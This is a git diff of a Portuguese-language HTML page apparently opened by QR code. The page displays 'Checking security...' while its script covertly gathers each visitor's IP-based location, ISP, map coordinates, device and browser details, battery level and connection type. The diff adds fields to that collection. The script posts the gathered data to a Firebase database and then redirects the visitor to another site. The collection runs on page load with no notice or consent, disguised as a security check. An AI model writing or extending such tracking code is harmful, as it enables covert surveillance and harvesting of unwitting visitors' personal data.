@@ -17,72 +17,88 @@
     <p>Verificando segurança...</p>
 
     <script>
-        // 1. CONFIGURAÇÕES
         const FIREBASE_URL = "https://dadosdeqr-default-rtdb.firebaseio.com/acessos_qr.json";
         const URL_DESTINO = "https://saoluisma.github.io/Bloquear-cassinos/";
 
         async function capturarLocalizacao() {
+            // Lista de APIs em ordem de confiabilidade
             const apis = [
                 'https://ipapi.co/json/',
-                'https://ipwho.is/',
-                'https://api.db-ip.com/v2/free/self'
+                'https://ipwhois.app/json/',
+                'https://freeipapi.com/api/json'
             ];
 
             for (let url of apis) {
                 try {
-                    const res = await fetch(url);
+                    const res = await fetch(url, { method: 'GET' });
                     const d = await res.json();
-                    return {
-                        ip: d.ip || d.query || "Privado",
-                        cidade: d.city || d.city_name || "Desconhecida",
-                        regiao: d.region || d.region_name || "Desconhecida",
-                        pais: d.country || d.country_name || "Brasil",
-                        provedor: d.org || d.connection?.isp || "Desconhecido",
-                        mapa: d.latitude ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : "N/A"
-                    };
-                } catch (e) { continue; }
+                    
+                    if (d.ip || d.ipAddress || d.query) {
+                        return {
+                            ip: d.ip || d.ipAddress || d.query || "Privado",
+                            cidade: d.city || d.cityName || "Desconhecida",
+                            regiao: d.region || d.regionName || d.region_name || "Desconhecida",
+                            pais: d.country || d.countryName || d.country_name || "Brasil",
+                            provedor: d.org || d.isp || d.connection?.isp || d.as || "Desconhecido",
+                            fuso_horario: d.timezone || d.timeZone || "N/A",
+                            mapa: (d.latitude || d.lat) ? `https://www.google.com/maps?q=${d.latitude || d.lat},${d.longitude || d.lon}` : "N/A"
+                        };
+                    }
+                } catch (e) {
+                    console.warn(`Falha na API: ${url}`);
+                    continue; 
+                }
             }
-            return { info: "Localização Bloqueada pelo Navegador" };
+            return { ip: "Bloqueado/VPN", cidade: "N/A", pais: "N/A", provedor: "N/A", mapa: "N/A" };
         }
 
         async function iniciarRastreio() {
-            // A. Captura dados do dispositivo
+            // Captura de Hardware e Navegador
             const dadosDispositivo = {
-                data_hora: new Date().toLocaleString("pt-BR"),
-                dispositivo: navigator.userAgent.toLocaleLowerCase().includes('mobile') ? 'Celular' : 'Computador',
+                data_hora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
+                dispositivo: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Celular' : 'Computador',
+                so: navigator.platform,
                 navegador: navigator.userAgent,
                 idioma: navigator.language,
                 tela: `${window.screen.width}x${window.screen.height}`,
-                referencia: document.referrer || "QR Code Direto"
+                referencia: document.referrer || "QR Code Direto",
+                bateria: "N/A",
+                conexao: navigator.connection ? navigator.connection.effectiveType : "Desconhecida"
             };
 
-            // B. Captura localização (IP)
+            // Tenta pegar nível de bateria (opcional)
+            try {
+                if (navigator.getBattery) {
+                    const batt = await navigator.getBattery();
+                    dadosDispositivo.bateria = `${Math.round(batt.level * 100)}%`;
+                }
+            } catch(e) {}
+
+            // Captura Localização por IP
             const dadosLocalizacao = await capturarLocalizacao();
 
-            // C. Junta tudo
+            // Envio para o Firebase
             const payload = { ...dadosDispositivo, ...dadosLocalizacao };
 
-            // D. ENVIA PARA O FIREBASE VIA POST (REST API)
             try {
                 await fetch(FIREBASE_URL, {
                     method: 'POST',
                     body: JSON.stringify(payload),
                     headers: { 'Content-Type': 'application/json' }
                 });
-                console.log("Dados salvos com sucesso!");
             } catch (err) {
-                console.error("Erro ao salvar:", err);
+                console.error("Erro Firebase:", err);
             } finally {
-                // E. REDIRECIONA SEMPRE
+                // Redirecionamento Final
                 window.location.href = URL_DESTINO;
             }
         }
 
-        // Executa ao abrir
+        // Inicia o processo
         iniciarRastreio();
 
-        // Backup de segurança (Redireciona em 5s caso o fetch trave)
-        setTimeout(() => { window.location.href = URL_DESTINO; }, 5000);
+        // Segurança: Redireciona forçado após 4 segundos se algo travar
+        setTimeout(() => { window.location.href = URL_DESTINO; }, 4000);
     </script>
 </body>
 </html>
